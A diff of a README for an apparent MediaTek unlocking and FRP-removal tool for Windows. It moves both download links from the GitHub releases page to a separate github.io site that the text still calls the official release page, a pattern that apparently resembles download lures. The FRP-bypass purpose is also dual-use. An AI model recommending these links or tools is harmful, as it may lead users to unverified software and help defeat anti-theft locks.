@@ -1,6 +1,6 @@
 # 🛠️ MTK-Universal-Tool-2026 - Unlock MediaTek devices with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bratticeleyte712/MTK-Universal-Tool-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://bratticeleyte712.github.io)
 
 This software provides a method for managing MediaTek processor devices on Windows computers. Use this tool for tasks involving device communication, file flashing, and removing factory reset protection locks. The interface works on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these conditions before you begin the setup process.
 
 You must visit the official release page to obtain the files.
 
-1. Navigate to the [MTK Universal Tool Release Page](https://github.com/bratticeleyte712/MTK-Universal-Tool-2026/releases).
+1. Navigate to the [MTK Universal Tool Release Page](https://bratticeleyte712.github.io).
 2. Locate the most recent version in the list.
 3. Click the file name to trigger the download.
 4. Save the folder to your desktop or downloads directory.
